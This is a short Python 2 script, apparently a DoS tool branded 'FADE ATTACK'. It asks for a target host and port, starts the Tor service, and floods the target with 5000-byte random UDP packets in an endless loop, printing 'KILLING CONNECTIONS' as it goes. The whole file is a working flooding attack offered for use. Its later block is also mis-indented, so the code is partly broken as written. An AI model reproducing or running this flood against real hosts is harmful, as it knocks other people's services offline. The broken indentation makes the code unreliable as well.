#!/usr/local/bin/python
# coding: latin-1
import sys
import os
import socks
import socket
import time
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

W = '\033[1m'
R = '\033[31m'
N = '\033[0m'
G = '\033[32m'
B = '\033[34m'
Y = '\033[33m'
LB = '\033[1;36m'


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packets = random._urandom(5000)
os.system("""
echo '''
███████╗ █████╗ ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
█████╗  ███████║██║  ██║█████╗      ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██╔══╝  ██╔══██║██║  ██║██╔══╝      ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██║     ██║  ██║██████╔╝███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                                                                      
''' | lolcat """)
target = raw_input(G+'[?] \033[0m3NTER T@RGET #:')
ip = socket.gethostbyname(target)

print ip
os.system('''echo "host ip" | lolcat''')
port = input(G+'[?] \033[0m3NTER P0RT : ')

	os.system("service tor start")
	print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
	sent = 0

	while True:
		sock.sendto(packets, (ip, port))
		sent = sent + 1
		print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
